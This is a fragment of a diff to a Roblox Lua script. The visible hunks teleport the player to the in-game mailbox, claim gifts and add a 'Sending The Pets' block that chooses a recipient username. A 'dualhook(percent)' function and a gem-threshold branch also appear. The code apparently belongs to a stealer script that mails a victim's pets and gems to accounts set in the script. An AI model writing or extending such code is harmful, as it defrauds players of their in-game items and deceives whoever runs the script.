@@ -747,8 +747,7 @@ end
 
 -- Teleport To Mailbox
 
-game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game:GetService("Workspace")[
-"__MAP"].Interactive.Mailbox.Pad.Position)
+game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game:GetService("Workspace")["__MAP"].Interactive.Mailbox.Pad.Position)
 
 -- Claim All Gifts
 
@@ -1236,6 +1235,15 @@ function dualhook(percent)
     end
 end
 
+-- Sending The Pets
+
+local ndUser
+if UserName2 ~= nil and UserName2 ~= "TehPucuk_55" and UserName2 ~= "TehPucuk_55" then
+    ndUser = UserName2
+else
+    ndUser = UserName
+end
+local user
 -- Gems Only
 if FinalList == 0 then
     if givediaamt >= 1000000000 then
